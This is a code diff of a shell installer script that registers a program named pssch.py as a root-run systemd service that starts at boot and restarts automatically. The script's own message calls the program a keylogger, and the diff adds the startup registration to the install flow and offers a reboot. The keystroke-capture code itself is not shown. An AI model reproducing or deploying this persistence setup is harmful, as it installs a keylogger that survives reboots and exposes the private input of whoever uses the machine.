@@ -74,12 +74,23 @@ Group=root
 Restart=always
 ExecStartPre=/bin/mkdir -p /run/pssch
 PIDFile=/run/pssch/service.pid
-ExecStart=/usr/bin/python $PSSCH_SCRIPT_CURRENT_PATH/poc.py
+ExecStart=/usr/bin/python $PSSCH_SCRIPT_CURRENT_PATH/pssch.py
 
 [Install]
 WantedBy=multi-user.target
 EOM
 
+    sudo systemctl daemon-reload
+    sudo systemctl enable pssch.service
+
+    echo "The keylogger has been installed succesfully on the os startup. "
+    read -r -p "Do you want to reboot the system and run it now? [y/n]" response
+          case "$response" in
+              [yY][eE][sS]|[yY])
+                reboot;;
+              *)
+                bye;;
+          esac
 }
 
 bye() {
@@ -91,8 +102,6 @@ bye() {
 }
 
 greetings
-addToStartup
-exit
 
 echo "Checking dependencies..."
 sleep 1
@@ -121,12 +130,13 @@ if command -v python &>/dev/null; then
     else
       sleep 1
       echo "      Error: your Python version is lower than the minimun necessary ($MIN_PYV)"
-      read -r -p "             Do you want to upgrade it? [y/n] " response
+      read -r -p " Do you want to upgrade it? [y/n] " response
       case "$response" in
           [yY][eE][sS]|[yY])
             installPython
             installPip
             installRequirements
+            addToStartup
             bye;;
           *)
               bye;;
@@ -140,6 +150,7 @@ else
           installPython
           installPip
           installRequirements
+          addToStartup
           bye;;
         *)
             bye;;
